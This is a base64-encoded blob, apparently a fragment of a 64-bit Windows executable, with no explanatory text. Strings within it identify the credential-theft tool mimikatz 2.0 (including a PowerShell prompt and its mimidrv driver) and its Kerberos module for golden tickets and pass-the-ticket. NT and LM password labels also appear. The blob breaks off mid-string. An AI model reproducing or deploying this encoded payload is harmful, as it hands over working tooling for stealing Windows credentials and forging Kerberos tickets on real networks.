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wBoACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaABfAGcAZQBuAGUAcgBpAGMAUAByAG8AYwBlAHMAcwBPAHIAUwBlAHIAdgBpAGMAZQBGAHIAbwBtAEIAdQBpAGwAZAAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABWAGUAcgB5AEIAYQBzAGkAYwBNAG8AZAB1AGwAZQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwBGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaABfAGcAZQBuAGUAcgBpAGMAUAByAG8AYwBlAHMAcwBPAHIAUwBlAHIAdgBpAGMAZQBGAHIAbwBtAEIAdQBpAGwAZAAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAAUwBlAHIAdgBpAGMAZQAgAGkAcwAgAG4AbwB0ACAAcgB1AG4AbgBpAG4AZwAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoAF8AZwBlAG4AZQByAGkAYwBQAHIAbwBjAGUAcwBzAE8AcgBTAGUAcgB2AGkAYwBlAEYAcgBvAG0AQgB1AGkAbABkACAAOwAgAGsAdQBsAGwAXwBtAF8AcwBlAHIAdgBpAGMAZQBfAGcAZQB0AFUAbgBpAHEAdQBlAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoAF8AZwBlAG4AZQByAGkAYwBQAHIAbwBjAGUAcwBzAE8AcgBTAGUAcgB2AGkAYwBlAEYAcgBvAG0AQgB1AGkAbABkACAAOwAgAEkAbgBjAG8AcgByAGUAYwB0ACAAdgBlAHIAcwBpAG8AbgAgAGkAbgAgAHIAZQBmAGUAcgBlAG4AYwBlAHMACgAAAAAAUQBXAE8AUgBEAAAAAAAAAFIARQBTAE8AVQBSAEMARQBfAFIARQBRAFUASQBSAEUATQBFAE4AVABTAF8ATABJAFMAVAAAAAAARgBVAEwATABfAFIARQBTAE8AVQBSAEMARQBfAEQARQBTAEMAUgBJAFAAVABPAFIAAAAAAAAAAABSAEUAUwBPAFUAUgBDAEUAXwBMAEkAUwBUAAAAAAAAAE0AVQBMAFQASQBfAFMAWgAAAAAAAAAAAEwASQBOAEsAAAAAAAAAAABEAFcATwBSAEQAXwBCAEkARwBfAEUATgBEAEkAQQBOAAAAAAAAAAAARABXAE8AUgBEAAAAAAAAAEIASQBOAEEAUgBZAAAAAABFAFgAUABBAE4ARABfAFMAWgAAAFMAWgAAAAAAAAAAAE4ATwBOAEUAAAAAAAAAAABTAGUAcgB2AGkAYwBlAHMAQQBjAHQAaQB2AGUAAAAAAFwAeAAlADAAMgB4AAAAAAAwAHgAJQAwADIAeAAsACAAAAAAAAAAAAAlADAAMgB4ACAAAAAAAAAAJQAwADIAeAAAAAAACgAAACUAcwAgAAAAJQBzAAAAAAAlAHcAWgAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcwB0AHIAaQBuAGcAXwBkAGkAcwBwAGwAYQB5AFMASQBEACAAOwAgAEMAbwBuAHYAZQByAHQAUwBpAGQAVABvAFMAdAByAGkAbgBnAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABUAG8AawBlAG4AAAAAAAAAAAAAAAAAAAAKACAAIAAuACMAIwAjACMAIwAuACAAIAAgAG0AaQBtAGkAawBhAHQAegAgADIALgAwACAAYQBsAHAAaABhACAAKAB4ADYANAApACAAcgBlAGwAZQBhAHMAZQAgACIASwBpAHcAaQAgAGUAbgAgAEMAIgAgACgATQBhAHkAIAAyADAAIAAyADAAMQA0ACAAMAA4ADoANQA2ADoANAA4ACkACgAgAC4AIwAjACAAXgAgACMAIwAuACAAIAAKACAAIwAjACAALwAgAFwAIAAjACMAIAAgAC8AKgAgACoAIAAqAAoAIAAjACMAIABcACAALwAgACMAIwAgACAAIABCAGUAbgBqAGEAbQBpAG4AIABEAEUATABQAFkAIABgAGcAZQBuAHQAaQBsAGsAaQB3AGkAYAAgACgAIABiAGUAbgBqAGEAbQBpAG4AQABnAGUAbgB0AGkAbABrAGkAdwBpAC4AYwBvAG0AIAApAAoAIAAnACMAIwAgAHYAIAAjACMAJwAgACAAIABoAHQAdABwADoALwAvAGIAbABvAGcALgBnAGUAbgB0AGkAbABrAGkAdwBpAC4AYwBvAG0ALwBtAGkAbQBpAGsAYQB0AHoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAG8AZQAuAGUAbwApAAoAIAAgACcAIwAjACMAIwAjACcAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdwBpAHQAaAAgACUAMwB1ACAAbQBvAGQAdQBsAGUAcwAgACoAIAAqACAAKgAvAAoACgAAAAAAAAAKAG0AaQBtAGkAawBhAHQAegAoAHAAbwB3AGUAcgBzAGgAZQBsAGwAKQAgACMAIAAlAHMACgAAAEkATgBJAFQAAAAAAAAAAABDAEwARQBBAE4AAAAAAAAAPgA+AD4AIAAlAHMAIABvAGYAIAAnACUAcwAnACAAbQBvAGQAdQBsAGUAIABmAGEAaQBsAGUAZAAgADoAIAAlADAAOAB4AAoAAAAAADoAOgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAbQBpAG0AaQBrAGEAdAB6AF8AZABvAEwAbwBjAGEAbAAgADsAIAAiACUAcwAiACAAbQBvAGQAdQBsAGUAIABuAG8AdAAgAGYAbwB1AG4AZAAgACEACgAAAAAAAAAKACUAMQA2AHMAAAAAAAAAIAAgAC0AIAAgACUAcwAAACAAIABbACUAcwBdAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAG0AaQBtAGkAawBhAHQAegBfAGQAbwBMAG8AYwBhAGwAIAA7ACAAIgAlAHMAIgAgAGMAbwBtAG0AYQBuAGQAIABvAGYAIAAiACUAcwAiACAAbQBvAGQAdQBsAGUAIABuAG8AdAAgAGYAbwB1AG4AZAAgACEACgAAAAAAAAAKAE0AbwBkAHUAbABlACAAOgAJACUAcwAAAAAAAAAAAAoARgB1AGwAbAAgAG4AYQBtAGUAIAA6AAkAJQBzAAAACgBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAA6AAkAJQBzAAAAAAAAAEtlcmJlcm9zAAAAAAAAAAB1AHMAZQByAAAAAAAAAAAAVwBpAGwAbAB5ACAAVwBvAG4AawBhACAAZgBhAGMAdABvAHIAeQAAAGcAbwBsAGQAZQBuAAAAAABQAHUAcgBnAGUAIAB0AGkAYwBrAGUAdAAoAHMAKQAAAHAAdQByAGcAZQAAAAAAAABSAGUAdAByAGkAZQB2AGUAIABjAHUAcgByAGUAbgB0ACAAVABHAFQAAAAAAAAAAAB0AGcAdAAAAEwAaQBzAHQAIAB0AGkAYwBrAGUAdAAoAHMAKQAAAAAAbABpAHMAdAAAAAAAAAAAAFAAYQBzAHMALQB0AGgAZQAtAHQAaQBjAGsAZQB0ACAAWwBOAFQAIAA2AF0AAAAAAHAAdAB0AAAAAAAAAAAAAABLAGUAcgBiAGUAcgBvAHMAIABwAGEAYwBrAGEAZwBlACAAbQBvAGQAdQBsAGUAAABrAGUAcgBiAGUAcgBvAHMAAAAAAAAAAAAAAAAAAAAAAFQAaQBjAGsAZQB0ACAAJwAlAHMAJwAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5ACAAcwB1AGIAbQBpAHQAdABlAGQAIABmAG8AcgAgAGMAdQByAHIAZQBuAHQAIABzAGUAcwBzAGkAbwBuAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdAB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFMAdQBiAG0AaQB0AFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAAvACAAUABhAGMAawBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHQAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBTAHUAYgBtAGkAdABUAGkAYwBrAGUAdABNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHQAdAAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwByAGUAYQBkAEQAYQB0AGEAIAAoADAAeAAlADAAOAB